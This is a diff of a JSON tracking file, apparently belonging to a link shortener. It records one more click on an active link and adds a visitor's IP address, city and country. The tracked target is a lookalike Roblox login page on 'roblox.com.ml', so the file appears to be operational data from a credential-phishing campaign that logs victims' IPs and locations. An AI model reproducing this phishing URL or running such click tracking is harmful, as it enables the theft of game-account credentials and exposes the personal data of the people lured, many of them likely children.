@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 610,
+    "useCount": 611,
     "createdBy": "admin",
     "clicks": [
       {
@@ -4990,6 +4990,14 @@
         "ip": "102.214.253.2",
         "country": "Kenya",
         "city": "Mombasa",
+        "flag": "🇰🇪",
+        "countryCode": "KE"
+      },
+      {
+        "timestamp": 1777115534701,
+        "ip": "102.205.237.67",
+        "country": "Kenya",
+        "city": "Nairobi",
         "flag": "🇰🇪",
         "countryCode": "KE"
       }
